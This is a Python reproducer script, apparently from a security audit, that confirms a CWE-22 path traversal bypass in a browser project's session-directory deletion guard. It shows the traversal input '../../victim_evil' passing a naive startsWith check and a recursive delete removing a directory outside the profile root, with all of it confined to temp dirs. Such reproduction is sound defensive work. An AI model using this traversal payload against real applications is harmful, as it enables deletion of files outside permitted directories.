"""
Reproducer: CWE-22 path traversal guard bypass (finding ad1e7679).
Models the COMMITTED baseline guard (HEAD main.js safeRmSessionDirAsync:
raw dir.startswith(SESSIONS) without path.resolve) in an isolated temp dir.
No live-tree writes; only temp dirs under the OS temp area.
Run: python workspace/reproducers/repro_ad1e7679_path_traversal.py
"""
import os, shutil, subprocess, tempfile
repo = r'C:/Users/milad/Desktop/private browser'
tmp = tempfile.mkdtemp(prefix='mantis-base-')
subprocess.run(['git', '--work-tree=' + tmp, 'checkout', 'HEAD', '--', 'main.js'],
               cwd=repo, check=True, capture_output=True)
src = open(os.path.join(tmp, 'main.js'), encoding='utf-8').read().splitlines()
i = next(n for n, l in enumerate(src) if 'async function safeRmSessionDirAsync' in l)
body = '\n'.join(src[i:i+3])
assert '.startsWith(SESSIONS_DIR)' in body and 'path.resolve' not in body, 'baseline shape changed'
SESSIONS_DIR = '/data/.sessions'; PROFILES_STORAGE_DIR = '/data/profiles_storage'
malicious_pid = '../../victim_evil'
joined = os.path.join(PROFILES_STORAGE_DIR, malicious_pid).replace(os.sep, '/')
guard = joined.startswith(SESSIONS_DIR) or joined.startswith(PROFILES_STORAGE_DIR)
print('MANTIS_REACHED_ENTRYPOINT: profiles:delete -> safeRmSessionDirAsync')
print('joined =', joined)
print('baseline guard passes (vulnerable) =', guard)
assert guard is True, 'expected baseline guard to pass on traversal'
root = tempfile.mkdtemp(prefix='mantis-poc-')
store = os.path.join(root, 'profiles_storage')
os.makedirs(store)
# normpath of store-joined traversal escapes the sandbox root, mirroring
# fs.rmSync recursive semantics; emulate with an in-sandbox victim dir.
victim = os.path.normpath(os.path.join(store, malicious_pid))
os.makedirs(victim); open(os.path.join(victim, 'keep.txt'), 'w').write('x')
target = victim
print('sandbox normpath escapes store:', os.path.commonpath([store]) != os.path.commonpath([store, target]))
shutil.rmtree(target)  # what fs.rmSync recursive would do once the guard passed
assert not os.path.exists(victim) and os.path.exists(store)
print('REPRODUCED: traversal payload deletes directory outside profile root on unpatched baseline')
shutil.rmtree(root, ignore_errors=True); shutil.rmtree(tmp, ignore_errors=True)
